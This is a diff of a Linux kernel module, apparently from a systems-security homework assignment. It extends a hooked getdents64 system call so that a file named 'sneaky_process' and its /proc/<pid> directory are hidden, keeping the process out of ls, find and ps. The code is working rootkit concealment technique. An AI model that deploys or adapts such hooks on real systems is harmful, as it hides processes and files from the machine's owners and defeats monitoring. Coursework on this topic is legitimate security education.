@@ -16,6 +16,9 @@
 
 #define PREFIX "sneaky_process"
 
+static char* pid = "";
+module_param(pid, charp, 0);
+MODULE_PARM_DESC(pid, "sneaky pid");
 
 
 //This is a pointer to the system call table
@@ -43,28 +46,32 @@ int disable_page_rw(void *ptr){
 // 1. hide the “sneaky_process” executable file from both the ‘ls’ and ‘find’
 // “ls /home/userid/hw5” should show all files in that directory except for “sneaky_process”.
 // “find /home/userid -name sneaky_process” should not return any results
+// 2. executing process will have a directory under /proc that is named with its process ID (e.g /proc/1480)
+// Your sneaky kernel module will hide the /proc/<sneaky_process_id> directory
+// “ls /proc” should not show a sub-directory with the name "1480""
+// “ps -a -u <your_user_id>” should not show an entry for process 1480 named “sneaky_process”
+
 asmlinkage int(*original_getdents64)(struct pt_regs *regs);
 
 asmlinkage int sneaky_getdents64(struct pt_regs* regs){
-  int totalDirpLength = (*original_getdents64)(regs);
-  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
-  int i = 0;
-  while (i < totalDirpLength) {
-    struct linux_dirent64 *curr = (void *)dirp + i;
-    if (strcmp(curr->d_name, "sneaky_process") == 0) {
-      int len = curr->d_reclen;
-      i += len;
-      totalDirpLength -= len;
-      char *prev = (char *)curr;
-      char *next = (char *)curr + len;
-      int remaining = totalDirpLength - i;
-      memmove(prev, next, remaining);
+  int totalDirpLen = original_getdents64(regs);
+  struct linux_dirent64* dirp = (void*)(regs->si);
+  int curr = 0;
+  while(curr < totalDirpLen){
+    struct linux_dirent64* dirpTmp = (void*)dirp + curr;
+    int dirpTmpLen = dirpTmp->d_reclen;
+    char * dirpTmpName=dirpTmp->d_name;
+    if(strcmp(dirpTmpName, "sneaky_process") == 0 || strcmp(dirpTmpName, pid) == 0){
+      int lenToBeCopied = totalDirpLen - curr - dirpTmpLen;
+      memmove((void*)dirpTmp, (void*)dirpTmp + dirpTmpLen, lenToBeCopied);
+      totalDirpLen -= dirpTmpLen;
       continue;
     }
-    i += curr->d_reclen;
+    curr += dirpTmpLen;
   }
-  return totalDirpLength;
+  return totalDirpLen;
 }
+
 
 
 // Function pointer will be used to save address of the original 'openat' syscall.
